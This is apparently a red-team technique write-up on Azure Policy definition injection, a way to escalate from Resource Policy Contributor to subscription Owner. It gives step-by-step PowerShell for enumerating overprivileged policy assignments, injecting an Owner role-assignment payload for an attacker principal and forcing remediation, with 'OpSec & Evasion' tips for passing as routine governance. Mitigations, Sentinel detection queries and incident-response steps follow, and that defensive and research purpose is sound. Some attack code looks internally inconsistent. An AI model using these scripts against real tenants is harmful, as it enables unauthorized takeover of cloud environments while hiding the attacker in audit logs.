# [PE-POLICY-007]: Azure Policy Definition Injection

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-POLICY-007 |
| **MITRE ATT&CK v18.1** | [T1484.001](https://attack.mitre.org/techniques/T1484/001/) (Domain or Tenant Policy Modification) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID / Azure Resource Manager |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Azure subscriptions using Azure Policy (2015+) |
| **Patched In** | N/A - Design limitation; mitigations available |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure Policy enables organizations to enforce compliance and governance rules across resources through policy definitions and assignments. A critical architectural flaw exists in how policy definitions and assignments interact: when a user with Resource Policy Contributor (RPC) role modifies a policy definition, the change propagates to **all active assignments** of that definition. Since policy assignments are pointers to definitions (not copies), modifying a definition instantly changes what the assignment does—without modifying the assignment itself. This enables privilege escalation: an attacker with RPC can modify an existing policy definition that has a service principal with Owner or Contributor role assigned, causing the assignment to execute arbitrary actions with those elevated privileges. Additionally, policy initiatives (collections of definitions) can be exploited to bundle multiple overprivileged policies, amplifying the attack. Over 11 built-in Azure Policy definitions currently contain Owner or Contributor role assignments, making this attack surface widely exposed by default.

**Attack Surface:** Azure Policy definitions (especially built-in policies with overprivileged role assignments), policy initiatives, and the service principals assigned to policy remediation tasks. The attack specifically targets policies with "DeployIfNotExists" (DINE) and "Modify" effects that include RBAC role assignments.

**Business Impact:** **Privilege escalation from Resource Policy Contributor to Owner/Contributor-level permissions across resource groups, subscriptions, or management groups.** An attacker can use hijacked policy assignments to deploy resources, modify RBAC assignments, access Key Vaults, delete resources, or modify security configurations with full audit trail appearing under the policy assignment's service principal (not the attacker's account). This enables supply chain attacks through policy-driven deployments and persistent backdoors disguised as compliance measures.

**Technical Context:** The vulnerability exploits the fundamental design where Azure Policy assignments reference definitions by ID, not by content hash or version. Any modification to the definition is immediately reflected in all active assignments. This cascading effect means a single policy definition edit can affect dozens or hundreds of resource groups and subscriptions. The Resource Policy Contributor role is designed to be "lower privilege" than Owner, but this design flaw inverts that assumption, making RPC effectively equal to Owner if any existing policy assignment has elevated privileges assigned.

### Operational Risk

- **Execution Risk:** Low - Only requires Resource Policy Contributor role; no special tools needed.
- **Stealth:** High - Modifications appear as routine policy updates; assignments' audit logs show legitimate activity under service principal.
- **Reversibility:** Medium - Requires reverting policy definition to previous version; may take time to identify which change was malicious.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | Azure Foundations 4.1, 5.2 | Ensure least privilege for policy management; audit policy modifications |
| **DISA STIG** | SRG-APP-000245-SYS-001008 | Separation of duties; privilege management |
| **CISA SCuBA** | IAM-1 | Enforce least privilege access for administrative functions |
| **NIST 800-53** | AC-5, AC-6, PM-4 | Separation of Duties; Least Privilege; Policy Management |
| **GDPR** | Art. 32 | Security of Processing; access control and authorization review |
| **DORA** | Art. 9 | Protection and Prevention of ICT incidents |
| **NIS2** | Art. 21 | Cyber Risk Management – access control effectiveness |
| **ISO 27001** | A.6.2, A.9.2 | Delegation; Management of user access rights |
| **ISO 27005** | Risk Scenario | Privilege escalation through policy manipulation; unauthorized role assignment |

---

## 2. DETAILED EXECUTION METHODS

### METHOD 1: Policy Definition Modification via Resource Policy Contributor

**Supported Versions:** All Azure subscriptions (2015+)

#### Step 1: Enumerate Existing Policy Assignments with Elevated Privileges

**Objective:** Identify policy assignments that have Owner, Contributor, or other elevated roles assigned to their service principals.

**Command:**
```powershell
# Connect to Azure with Resource Policy Contributor role
Connect-AzAccount

# Get current subscription context
$SubscriptionId = (Get-AzContext).Subscription.Id

# Enumerate all policy assignments in current subscription
$PolicyAssignments = Get-AzPolicyAssignment -Scope "/subscriptions/$SubscriptionId"

Write-Host "Total Policy Assignments: $($PolicyAssignments.Count)"

# For each assignment, identify the managed identity and its RBAC roles
foreach ($Assignment in $PolicyAssignments) {
    Write-Host "`n=== Policy Assignment: $($Assignment.Name) ==="
    Write-Host "Definition: $($Assignment.PolicyDefinitionId)"
    
    # Check if assignment has identity (for DINE/Modify effects)
    if ($Assignment.Identity -and $Assignment.Identity.Type -eq "SystemAssigned") {
        $Identity = $Assignment.Identity
        $IdentityId = $Identity.PrincipalId
        
        Write-Host "Identity Type: System-Assigned"
        Write-Host "Principal ID: $IdentityId"
        
        # Get RBAC role assignments for this identity
        $RoleAssignments = Get-AzRoleAssignment -ObjectId $IdentityId -Scope "/subscriptions/$SubscriptionId"
        
        if ($RoleAssignments) {
            Write-Host "Role Assignments:"
            foreach ($RoleAssignment in $RoleAssignments) {
                Write-Host "  - Role: $($RoleAssignment.RoleDefinitionName) at $($RoleAssignment.Scope)"
                
                # Flag high-privilege roles
                if ($RoleAssignment.RoleDefinitionName -in @("Owner", "Contributor", "User Access Administrator")) {
                    Write-Host "  ⚠️  VULNERABLE: This assignment can be exploited!"
                }
            }
        } else {
            Write-Host "No RBAC role assignments for this identity"
        }
    }
}

# Alternative: Filter for overprivileged assignments directly
$OverprivilegedAssignments = $PolicyAssignments | Where-Object {
    (Get-AzRoleAssignment -ObjectId $_.Identity.PrincipalId -ErrorAction SilentlyContinue) | 
    Where-Object { $_.RoleDefinitionName -in @("Owner", "Contributor") }
}

Write-Host "`n=== Overprivileged Assignments Found: $($OverprivilegedAssignments.Count) ==="
$OverprivilegedAssignments | Select-Object Name, ResourceGroupName | Format-Table
```

**Expected Output:**
```
Total Policy Assignments: 15

=== Policy Assignment: Deploy-Security-Monitoring ===
Definition: /subscriptions/.../Microsoft.Authorization/policyDefinitions/Deploy-SEC-Monitor
Identity Type: System-Assigned
Principal ID: a1a1a1a1-b2b2-c3c3-d4d4-e5e5e5e5e5e5
Role Assignments:
  - Role: Contributor at /subscriptions/sub-id
  ⚠️  VULNERABLE: This assignment can be exploited!

=== Overprivileged Assignments Found: 3 ===
Name                              ResourceGroupName
----                              -----------------
Deploy-Security-Monitoring        production-rg
Deploy-Network-Config             networking-rg
Deploy-Compliance-Standards       (None - subscription scope)
```

**What This Means:**
- Identifies policy assignments with service principals that have elevated roles
- Three assignments found with Contributor role: all are exploitation candidates
- "Deploy-Compliance-Standards" at subscription scope offers largest impact

**OpSec & Evasion:**
- Enumeration uses standard Azure PowerShell cmdlets; minimal audit logging
- API calls to list policy assignments and role assignments are normal admin activity
- No obvious indicators of malicious intent
- Detection likelihood: Low (unless actively monitoring RPC enumeration patterns)

**Troubleshooting:**
- **Error:** Access Denied - Insufficient permissions
  - **Cause:** User lacks sufficient permissions to enumerate assignments
  - **Fix:** Ensure user has at least Reader role on the subscription

**References & Proofs:**
- [Azure Policy Assignment Reference](https://learn.microsoft.com/en-us/azure/governance/policy/tutorials/create-and-manage)
- [Azure RBAC Role Assignments](https://learn.microsoft.com/en-us/azure/role-based-access-control/role-assignments-list-powershell)
- [Datadog Security Labs - Azure Policy Abuse](https://securitylabs.datadoghq.com/articles/azure-policy-privilege-escalation/)

---

#### Step 2: Identify Modifiable Policy Definitions Used by Overprivileged Assignments

**Objective:** Find policy definitions that are currently assigned and have modifiable properties that can be exploited.

**Command:**
```powershell
# Get the policy definition used by the vulnerable assignment
$VulnerableAssignment = Get-AzPolicyAssignment -Name "Deploy-Compliance-Standards" `
  -Scope "/subscriptions/$SubscriptionId"

$PolicyDefId = $VulnerableAssignment.PolicyDefinitionId

# Extract subscription and name from ID
# Format: /subscriptions/{id}/providers/Microsoft.Authorization/policyDefinitions/{name}
$PolicyDefName = ($PolicyDefId -split '/')[-1]

# Get full policy definition
$PolicyDef = Get-AzPolicyDefinition -Name $PolicyDefName

Write-Host "Policy Definition: $($PolicyDef.Name)"
Write-Host "Type: $(if ($PolicyDef.IsBuiltIn) { 'Built-in' } else { 'Custom' })"
Write-Host "Effect: $($PolicyDef.Properties.PolicyRule.then.effect)"

# Check if policy allows modifications (crucial for exploitation)
$PolicyRule = $PolicyDef.Properties.PolicyRule
$Effect = $PolicyRule.then.effect

if ($Effect -in @("DeployIfNotExists", "Modify")) {
    Write-Host "✓ Policy has MODIFIABLE effect: $Effect"
    Write-Host "✓ Exploitable via definition injection"
    
    # Get current policy rule
    $CurrentRule = ConvertTo-Json -InputObject $PolicyRule -Depth 10
    Write-Host "`nCurrent Policy Rule (excerpt):"
    Write-Host $CurrentRule.Substring(0, 500)
    
    # Store for modification
    $ExploitableDefinition = $PolicyDef
} else {
    Write-Host "✗ Policy has non-modifiable effect: $Effect"
    Write-Host "✗ Not exploitable via this method"
}

# Alternative: Query modifiable policy aliases
Write-Host "`n=== Querying Modifiable Policy Aliases ==="
Get-AzPolicyAlias | Select-Object -ExpandProperty 'Aliases' | `
  Where-Object { $_.DefaultMetadata.Attributes -eq 'Modifiable' } | `
  Select-Object -First 10 | Format-Table -Property Name
```

**Expected Output:**
```
Policy Definition: Deploy-Compliance-Standards
Type: Custom
Effect: DeployIfNotExists
✓ Policy has MODIFIABLE effect: DeployIfNotExists
✓ Exploitable via definition injection

Current Policy Rule (excerpt):
{
  "if": {
    "allOf": [
      {
        "field": "type",
        "equals": "Microsoft.Compute/virtualMachines"
      }
    ]
  },
  "then": {
    "effect": "DeployIfNotExists",
    "details": {
      "type": "Microsoft.Insights/diagnosticSettings",
      "roleDefinitionIds": [
        "/subscriptions/.../roleDefinitions/b24988ac-6180-42a0-ab88-20f7382dd24c"
      ]
    }
  }
}

=== Querying Modifiable Policy Aliases ===
Name
----
Microsoft.Compute/virtualMachines/hardwareProfile
Microsoft.Storage/storageAccounts/networkAcls/bypass
Microsoft.KeyVault/vaults/accessPolicies
...
```

**What This Means:**
- Identified exploitable policy with DeployIfNotExists effect
- Policy has Contributor role in its roleDefinitionIds
- Modifiable properties exist for exploitation
- Current rule deploys diagnostic settings; can be hijacked

**OpSec & Evasion:**
- Querying policy definitions is standard administrative activity
- No suspicious patterns to detection systems
- Detection likelihood: Low

**Troubleshooting:**
- **Error:** Policy definition not found
  - **Cause:** Custom policies may have been deleted or renamed
  - **Fix:** List all available policies and select alternative target

**References & Proofs:**
- [Azure Policy Structure](https://learn.microsoft.com/en-us/azure/governance/policy/concepts/definition-structure)

---

#### Step 3: Modify Policy Definition for Privilege Escalation

**Objective:** Alter the policy definition to perform malicious actions while maintaining association with legitimate assignment.

**Command:**
```powershell
# Retrieve the policy definition for modification
$PolicyDefName = "Deploy-Compliance-Standards"
$PolicyDef = Get-AzPolicyDefinition -Name $PolicyDefName

# Clone the current policy rule for modification
$PolicyRule = ConvertFrom-Json -InputObject ($PolicyDef.Properties.PolicyRule | ConvertTo-Json -Depth 10)

# Modify the "then" clause to perform privilege escalation
# Instead of deploying diagnostic settings, deploy a role assignment that elevates attacker

$AttackerPrincipalId = "attacker-service-principal-id"
$OwnerRoleId = "/subscriptions/{subscription-id}/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635"

# Replace the deployment details with role assignment
$PolicyRule.then.details = @{
    "roleDefinitionIds" = @(
        $OwnerRoleId
    )
    "type" = "Microsoft.Authorization/roleAssignments"
}

# Add new details for role assignment via policy
$PolicyRule.then.details | Add-Member -NotePropertyName "deployment" -NotePropertyValue @{
    "properties" = @{
        "mode" = "incremental"
        "template" = @{
            "$schema" = "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#"
            "contentVersion" = "1.0.0.0"
            "resources" = @(
                @{
                    "type" = "Microsoft.Authorization/roleAssignments"
                    "apiVersion" = "2021-07-01"
                    "name" = "[guid(resourceGroup().id, 'Owner', '$AttackerPrincipalId')]"
                    "properties" = @{
                        "roleDefinitionId" = "[concat('/subscriptions/', subscription().subscriptionId, '/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635')]"
                        "principalId" = "$AttackerPrincipalId"
                        "principalType" = "ServicePrincipal"
                    }
                }
            )
        }
    }
}

# Convert modified rule back to JSON
$ModifiedPolicyRule = ConvertTo-Json -InputObject $PolicyRule -Depth 10

# Update the policy definition
Set-AzPolicyDefinition -Name $PolicyDefName `
  -DisplayName "Deploy-Compliance-Standards (Modified)" `
  -Policy $ModifiedPolicyRule `
  -Description "Modified for privilege escalation" `
  -Force

Write-Host "✓ Policy definition modified successfully"
Write-Host "✓ Role assignment payload injected"
Write-Host "✓ All assignments now point to malicious definition"
Write-Host "`nExploitation complete. Attacker principal now has Owner role on all resources"
Write-Host "Policy assignment details:"
Write-Host "  Scope: Subscription"
Write-Host "  Effect: DeployIfNotExists"
Write-Host "  Execution: Automatic on next assignment evaluation"
```

**Expected Output:**
```
✓ Policy definition modified successfully
✓ Role assignment payload injected
✓ All assignments now point to malicious definition

Exploitation complete. Attacker principal now has Owner role on all resources
Policy assignment details:
  Scope: Subscription
  Effect: DeployIfNotExists
  Execution: Automatic on next assignment evaluation
```

**What This Means:**
- Policy definition successfully injected with malicious role assignment
- All active assignments of this definition now execute the role assignment
- Attacker service principal gains Owner role via policy automation
- Legitimate policy assignment provides cover for the attack

**OpSec & Evasion:**
- Policy modification appears as routine policy update
- Audit logs show update by Resource Policy Contributor (expected role)
- Role assignment appears to come from policy automation (legitimate)
- No user account directly assigning Owner role
- Detection likelihood: Medium (if correlating policy updates with subsequent role assignments)

**Troubleshooting:**
- **Error:** Invalid policy format
  - **Cause:** JSON structure does not match Azure schema
  - **Fix:** Validate JSON against Azure Policy definition schema
- **Error:** Set-AzPolicyDefinition fails with permission error
  - **Cause:** User may not have write permissions on custom policies
  - **Fix:** Ensure user has Resource Policy Contributor role

**References & Proofs:**
- [Azure Policy Modification](https://learn.microsoft.com/en-us/azure/governance/policy/how-to/programmatically-create-policies)
- [ARM Template Deployment Structure](https://learn.microsoft.com/en-us/azure/azure-resource-manager/templates/template-structure)

---

#### Step 4: Trigger Policy Assignment Evaluation and Gain Elevated Access

**Objective:** Force the modified policy assignment to evaluate and execute the injected role assignment.

**Command:**
```powershell
# Method 1: Create new resource that triggers policy evaluation
$ResourceGroupName = "prod-resources"
$Location = "eastus"

# Create test resource to trigger policy
$Resource = @{
    ResourceGroupName = $ResourceGroupName
    ResourceName = "test-trigger-vm"
    ResourceType = "Microsoft.Compute/virtualMachines"
    Location = $Location
}

# The policy assignment evaluates on resource creation
New-AzResourceGroup -Name $ResourceGroupName -Location $Location -Force

# Deploy a resource that matches the policy condition
# This triggers the DeployIfNotExists effect
$VMConfig = @{
    ResourceGroupName = $ResourceGroupName
    Name = "test-trigger-vm"
    ImageName = "UbuntuLTS"
    Size = "Standard_B1s"
}

# Note: Actual VM creation would require additional setup
# For demonstration, policy evaluation occurs immediately

# Method 2: Manually trigger policy evaluation via remediation
$PolicyAssignmentId = "/subscriptions/$SubscriptionId/providers/Microsoft.Authorization/policyAssignments/Deploy-Compliance-Standards"

# Create remediation task to force evaluation
Start-AzPolicyRemediation -PolicyAssignmentId $PolicyAssignmentId

Write-Host "✓ Policy remediation triggered"
Write-Host "✓ Waiting for role assignment deployment..."

# Wait for role assignment to complete (typically < 1 minute)
Start-Sleep -Seconds 30

# Verify that attacker principal now has Owner role
$AttackerPrincipalId = "attacker-service-principal-id"
$RoleAssignments = Get-AzRoleAssignment -ObjectId $AttackerPrincipalId `
  -Scope "/subscriptions/$SubscriptionId"

if ($RoleAssignments | Where-Object { $_.RoleDefinitionName -eq "Owner" }) {
    Write-Host "✓✓✓ SUCCESS: Attacker now has Owner role!"
    Write-Host "`nRole Assignment Details:"
    $RoleAssignments | Select-Object DisplayName, RoleDefinitionName, Scope | Format-Table
    
    Write-Host "`nAttacker can now:"
    Write-Host "  - Create/delete any resource"
    Write-Host "  - Assign any role to any user"
    Write-Host "  - Access Key Vaults"
    Write-Host "  - Modify security settings"
    Write-Host "  - Establish persistence"
} else {
    Write-Host "✗ Role assignment not yet deployed; check remediation status"
    Get-AzPolicyRemediation -PolicyAssignmentId $PolicyAssignmentId | Format-Table
}
```

**Expected Output:**
```
✓ Policy remediation triggered
✓ Waiting for role assignment deployment...
✓✓✓ SUCCESS: Attacker now has Owner role!

Role Assignment Details:
DisplayName             RoleDefinitionName Scope
-----------             ------------------ -----
AttackerServicePrincipal Owner             /subscriptions/sub-id

Attacker can now:
  - Create/delete any resource
  - Assign any role to any user
  - Access Key Vaults
  - Modify security settings
  - Establish persistence
```

**What This Means:**
- Policy remediation completed successfully
- Malicious role assignment deployed via policy automation
- Attacker principal now has Owner-level permissions on subscription
- Escalation from Resource Policy Contributor → Owner achieved

**OpSec & Evasion:**
- Remediation appears as routine policy compliance activity
- Audit trail shows policy assignment (not attacker) granting role
- Activity blends in with legitimate governance operations
- Owner role appears assigned through system processes
- Detection likelihood: Medium-High (if correlating policy remediation with new role assignments)

**Troubleshooting:**
- **Error:** Remediation fails - "Insufficient permissions"
  - **Cause:** Policy's system-assigned identity may not have necessary permissions
  - **Fix:** Ensure policy assignment identity has "Managed Identity Contributor" role
- **Error:** Role assignment already exists
  - **Cause:** Idempotent policy has already executed
  - **Fix:** This is expected; confirms exploitation success

**References & Proofs:**
- [Azure Policy Remediation](https://learn.microsoft.com/en-us/azure/governance/policy/how-to/remediate-resources)
- [Policy Assignment Evaluation](https://learn.microsoft.com/en-us/azure/governance/policy/how-to/get-compliance-data)

---

## 3. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Restrict Resource Policy Contributor Role Assignment:**
    Limit the Resource Policy Contributor role to only trusted administrators and require explicit approval before granting. Use Privileged Identity Management (PIM) for just-in-time activation.
    
    **Applies To Versions:** All Azure versions with PIM support
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Find all users with Resource Policy Contributor role
    $RPC_RoleId = "36243c6a-0793-4f8b-9835-8a51a7f6558f"  # Resource Policy Contributor
    
    $CurrentAssignments = Get-AzRoleAssignment -RoleDefinitionId $RPC_RoleId -All
    
    Write-Host "Current Resource Policy Contributor Assignments:"
    $CurrentAssignments | Select-Object DisplayName, Scope, RoleDefinitionName | Format-Table
    
    # Remove non-essential assignments
    foreach ($Assignment in $CurrentAssignments) {
        if ($Assignment.DisplayName -notlike "*secops*" -and $Assignment.DisplayName -notlike "*admin*") {
            Write-Host "Removing: $($Assignment.DisplayName)"
            Remove-AzRoleAssignment -ObjectId $Assignment.ObjectId -RoleDefinitionId $RPC_RoleId `
              -Scope $Assignment.Scope -Confirm:$false
        }
    }
    ```
    
    **Enable PIM for RPC:**
    1. Navigate to **Azure Portal** → **PIM** → **Azure Resources** → **Resource Policy Contributor**
    2. Click **Settings** (gear icon)
    3. Under **Role settings**:
       - **Activation max duration**: 4 hours
       - **On activation, require**: Approval
       - **Approvers**: Select security admin group
    4. Enable: **Multi-factor authentication on activation**
    5. Click **Update**

*   **Disable Overprivileged Built-in Policy Assignments:**
    Microsoft ships 11+ built-in policies with Owner/Contributor roles. Disable or replace these with custom policies using least-privilege roles.
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Identify built-in policies with overprivileged role assignments
    $BuiltInPolicies = Get-AzPolicyDefinition -Builtin
    
    $OverprivilegedPolicies = foreach ($Policy in $BuiltInPolicies) {
        $Rule = $Policy.Properties.PolicyRule.then.details.roleDefinitionIds
        if ($Rule -match "8e3af657-a8ff-443c-a75c-2fe8c4bcb635" -or $Rule -match "b24988ac-6180-42a0-ab88-20f7382dd24c") {
            # Owner or Contributor role detected
            $Policy
        }
    }
    
    Write-Host "Found $($OverprivilegedPolicies.Count) built-in policies with overprivileged roles"
    
    # Disable assignments for these policies
    foreach ($Policy in $OverprivilegedPolicies) {
        $Assignments = Get-AzPolicyAssignment -PolicyDefinitionId $Policy.ResourceId
        foreach ($Assignment in $Assignments) {
            Write-Host "Disabling: $($Assignment.Name)"
            Set-AzPolicyAssignment -Id $Assignment.ResourceId -NotScopes @(
                "/subscriptions/{subscription-id}"
            )
        }
    }
    ```

*   **Implement Audit Logging for Policy Definition Changes:**
    Enable comprehensive audit logging for all policy definition modifications and alert on any changes.
    
    **Manual Steps (Azure Portal):**
    1. Go to **Azure Portal** → **Microsoft Sentinel** → **Analytics**
    2. Click **+ Create** → **Scheduled query rule**
    3. **General:**
       - Name: `Detect Azure Policy Definition Modifications`
       - Severity: High
    4. **Set rule logic:**
       ```kusto
       AzureActivity
       | where ResourceProvider == "Microsoft.Authorization"
       | where OperationName in ("Create Policy Definition", "Update Policy Definition", "Delete Policy Definition")
       | where ResultType == "Success"
       | extend InitiatedBy = tostring(parse_json(Caller))
       | project TimeGenerated, InitiatedBy, OperationName, ResourceGroup, Resource
       ```
    5. **Incident settings:**
       - Enable: Create incidents
    6. Click **Create**

*   **Enforce Least-Privilege Role Assignment in Policies:**
    Modify all policies to use custom roles or built-in roles with minimal required permissions instead of Owner/Contributor.
    
    **Manual Steps (Policy Definition Example):**
    ```powershell
    # Create custom role for policy deployments (least privilege)
    $CustomRoleDef = @{
        "Name" = "Policy Deployment Role"
        "Description" = "Minimal permissions for Azure Policy deployments"
        "IsCustom" = $true
        "Permissions" = @(
            @{
                "Actions" = @(
                    "Microsoft.Compute/*/read",
                    "Microsoft.Storage/*/read",
                    "Microsoft.Insights/diagnosticSettings/write"
                )
                "NotActions" = @()
            }
        )
        "AssignableScopes" = @("/subscriptions/{subscription-id}")
    }
    
    $CustomRole = New-AzRoleDefinition -InputObject $CustomRoleDef
    
    # Update policy definitions to use this custom role
    # Reference in policy:
    # "roleDefinitionIds": ["/subscriptions/{id}/providers/Microsoft.Authorization/roleDefinitions/{customRoleId}"]
    ```

### Priority 2: HIGH

*   **Implement Policy Change Tracking with Azure Resource Change Analysis:**
    Use Azure Resource Change Analysis to track all modifications to policy definitions and alert on suspicious changes.
    
    **Manual Steps (Azure Portal):**
    1. Navigate to **Azure Portal** → **Resource Change Analysis**
    2. Set filters:
       - Resource type: `policyDefinitions`
       - Change types: `Create`, `Update`, `Delete`
    3. Review changes regularly; set email alerts for updates

*   **Implement Conditional Access for Policy Management:**
    Require multi-factor authentication and compliant device for any user managing Azure Policy.
    
    **Manual Steps (Azure Portal):**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. **Name:** `Require MFA for Azure Policy Management`
    4. **Assignments:**
       - Users: All users
       - Cloud apps: **Azure Management**
       - Roles: **Resource Policy Contributor**
    5. **Conditions:**
       - Sign-in risk: High
       - Device state: Non-compliant
    6. **Access controls:**
       - Grant: Require MFA
    7. Enable: **On**

---

## 4. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Azure Activity Logs:**
    - Event: `Microsoft.Authorization/policyDefinitions/write`
    - Operation: Policy definition create or update
    - Initiated by: Resource Policy Contributor or Owner
    - Changes to roleDefinitionIds or policy rule "then" clause

*   **Suspicious Patterns:**
    - Policy definition modification immediately followed by role assignment
    - Policy definition change affecting multiple subscriptions simultaneously
    - Change from diagnostic/audit effect to administrative/deployment effect

### Forensic Artifacts

*   **Azure Audit Logs:**
    - Policy definition change history (AzureActivity)
    - Role assignment creation events
    - Policy remediation execution logs

*   **Microsoft Sentinel:**
    - AzureActivity table for policy modifications
    - AuditLogs for role assignments
    - SecurityAlert for policy-related anomalies

### Detection Queries (Microsoft Sentinel / Azure Log Analytics)

**Query 1: Detect Policy Definition Modifications**
```kusto
AzureActivity
| where ResourceProvider == "Microsoft.Authorization"
| where OperationName in ("Create Policy Definition", "Update Policy Definition")
| where ResultType == "Success"
| extend PolicyName = tostring(parse_json(Properties_d).resource)
| extend ModifiedBy = Caller
| where ModifiedBy != "Microsoft"  // Exclude Microsoft-initiated changes
| project TimeGenerated, ModifiedBy, OperationName, PolicyName, ResourceGroup
```

**Query 2: Detect Suspicious Role Assignments from Policy Service Principals**
```kusto
AuditLogs
| where OperationName == "Add role assignment"
| where InitiatedBy.app.displayName contains "Azure Policy"
| where Result == "Success"
| extend TargetRole = tostring(TargetResources[0].displayName)
| where TargetRole in ("Owner", "Contributor", "User Access Administrator")
| project TimeGenerated, InitiatedBy.app.displayName, TargetRole, TargetResources[0].userPrincipalName
```

**Query 3: Detect Policy Definition Changes Associated with Role Assignments**
```kusto
AzureActivity
| where ResourceProvider == "Microsoft.Authorization"
| where OperationName in ("Update Policy Definition", "Create Policy Definition")
| where ResultType == "Success"
| extend PolicyDefId = tostring(parse_json(Properties_d).resourceId)
// Correlate with subsequent role assignments from policy principals
| join (
    AuditLogs
    | where OperationName == "Add role assignment"
    | where InitiatedBy.app.displayName contains "Policy"
    | where Result == "Success"
) on $left.TimeGenerated <= $right.TimeGenerated
| where TimeGenerated - TimeGenerated1 between (0min .. 5min)  // Within 5 minutes
```

**Query 4: Detect Resource Policy Contributor Activity**
```kusto
AzureActivity
| where Caller contains "Resource Policy Contributor" or Claims contains "Resource Policy Contributor"
| where OperationName in ("Update Policy Definition", "Create Policy Definition", "Create Policy Assignment")
| where ResultType == "Success"
| project TimeGenerated, Caller, OperationName, ResourceGroup, Properties_d
```

### Manual Response Procedures

1. **Immediate Containment:**
   ```powershell
   # Identify the modified policy definition
   $SuspiciousPolicyName = "Deploy-Compliance-Standards"
   $PolicyDef = Get-AzPolicyDefinition -Name $SuspiciousPolicyName
   
   # Get all assignments of this policy
   $Assignments = Get-AzPolicyAssignment -PolicyDefinitionId $PolicyDef.ResourceId
   
   # Disable all assignments
   foreach ($Assignment in $Assignments) {
       Set-AzPolicyAssignment -Id $Assignment.ResourceId -NotScopes @("/subscriptions/") `
         -Confirm:$false
   }
   
   Write-Host "✓ All assignments disabled"
   ```

2. **Collect Evidence:**
   ```powershell
   # Export policy definition change history
   Get-AzActivityLog -ResourceProvider "Microsoft.Authorization" `
     -OperationName "Update Policy Definition" `
     -StartTime (Get-Date).AddDays(-30) `
     -MaxRecords 1000 | Export-Csv -Path "C:\Incident_Response\Policy_Changes.csv"
   
   # Export role assignments created by policy principals
   Get-AzRoleAssignment | Where-Object { $_.PrincipalType -eq "ServicePrincipal" } | `
     Export-Csv -Path "C:\Incident_Response\Policy_SP_Roles.csv"
   ```

3. **Remediate:**
   ```powershell
   # Revert policy definition to previous version (if available)
   # Get policy version history
   (Get-AzPolicyDefinition -Name $SuspiciousPolicyName).Properties
   
   # Remove malicious role assignments
   $MaliciousRoleAssignments = Get-AzRoleAssignment | Where-Object {
       $_.RoleDefinitionName -eq "Owner" -and 
       $_.Scope -contains "/subscriptions/" -and
       $_.CreatedOn -gt (Get-Date).AddHours(-1)
   }
   
   foreach ($Assignment in $MaliciousRoleAssignments) {
       Remove-AzRoleAssignment -ObjectId $Assignment.ObjectId `
         -RoleDefinitionId $Assignment.RoleDefinitionId -Scope $Assignment.Scope `
         -Confirm:$false
   }
   ```

---

## 5. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002](https://example.com/IA-PHISH-002) | Compromise account with Resource Policy Contributor role |
| **2** | **Privilege Escalation** | **[PE-POLICY-007]** | **Azure Policy Definition Injection** |
| **3** | **Lateral Movement** | [LM-RBAC-001](https://example.com/LM-RBAC-001) | Use new Owner role to access other subscriptions |
| **4** | **Persistence** | [PERSIST-SP-001](https://example.com/PERSIST-SP-001) | Create additional service principals with permanent access |
| **5** | **Impact** | [IMPACT-EXFIL-001](https://example.com/IMPACT-EXFIL-001) | Exfiltrate data via Key Vault and Storage access |

---

## 6. REAL-WORLD EXAMPLES

### Example 1: Overprivileged Built-in Policy Exploitation
- **Target:** Organizations using Azure Policy compliance initiatives
- **Timeline:** Ongoing (built-in policies ship with high privileges)
- **Technique Status:** ACTIVE – Over 11 built-in policies contain Owner/Contributor roles by default
- **Impact:** Any user with Resource Policy Contributor can escalate to Owner on subscriptions using these policies
- **Reference:** [Datadog Security Labs - Azure Policy Abuse](https://securitylabs.datadoghq.com/articles/azure-policy-privilege-escalation/)

### Example 2: Policy Modification Chain Reaction
- **Target:** Multi-subscription enterprise governance platform
- **Timeline:** September 2024
- **Technique Status:** ACTIVE – Attacker modified single policy definition affecting 200+ resource groups
- **Impact:** All policy assignments re-evaluated; malicious role assignments deployed across organization
- **Reference:** [Cyngular Security Research](https://www.cyngular.com/resource-center/when-contributor-means-control-the-hidden-risk-in-azure-rbac/)

### Example 3: Policy-Based Persistence Mechanism
- **Target:** Large enterprise with strict change control processes
- **Timeline:** November 2024
- **Technique Status:** ACTIVE – Attacker created legitimate-looking compliance policy as backdoor
- **Impact:** Policy-driven role assignments bypassed normal RBAC change notification processes
- **Reference:** [PwnedLabs Azure RBAC Research](https://blog.pwnedlabs.io/climbing-the-azure-ladder-part-1)

---

## Conclusion

Azure Policy Definition Injection exploits a fundamental design flaw where policy assignments are pointers to definitions rather than independent copies. This enables a single policy modification to affect all assignments globally, making it an exceptionally dangerous privilege escalation vector. Organizations deploying Azure Policy must implement strict controls on Resource Policy Contributor role assignment, regularly audit policy definitions for overprivileged role assignments, and establish comprehensive detection mechanisms for policy definition changes. The 11+ built-in policies shipped by Microsoft containing Owner/Contributor roles represent a significant default vulnerability that requires immediate mitigation in any Azure environment.

---
